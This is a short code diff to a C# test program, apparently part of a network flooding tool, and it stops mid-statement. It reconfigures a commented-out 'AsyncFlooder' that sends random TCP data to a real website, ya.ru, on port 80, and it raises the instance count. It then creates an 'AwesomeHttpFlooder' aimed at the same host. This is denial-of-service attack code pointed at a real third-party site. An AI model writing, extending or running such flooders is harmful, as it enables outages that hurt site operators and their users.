@@ -1,4 +1,4 @@
-﻿using System;
+﻿using System.Diagnostics;
 using System.Net;
 using System.Net.Sockets;
 using System.Threading;
@@ -9,23 +9,26 @@ namespace TestApp {
     class Program {
         static void Main( string[] args ) {
             var r = new FastRandom.FastRandom();
+            Debug.Listeners.Add( new ConsoleTraceListener( true ) );
             //var f = new AsyncFlooder(
             //    new AttackInfo {
             //        Protocol = ProtocolType.Tcp,
             //        Target = new IPEndPoint(
             //            Dns.GetHostAddresses(
             //                "ya.ru"
-            //            )[0],
+            //            )[ 0 ],
             //            80
             //        ),
-            //        Randomizer = (a,b)=>{
+            //        Randomizer = ( a, b ) => {
             //            r.NextBytes( a );
             //            return a.Length;
             //        },
-            //        MaxRead = 0
+            //        MaxRead = 0,
+            //        bufferSize = 50000
             //    },
-            //    1
+            //    5
             //);
+
             var f = new AwesomeHttpFlooder(
                 new IPEndPoint(
                     Dns.GetHostAddresses( "ya.ru" )[ 0 ],
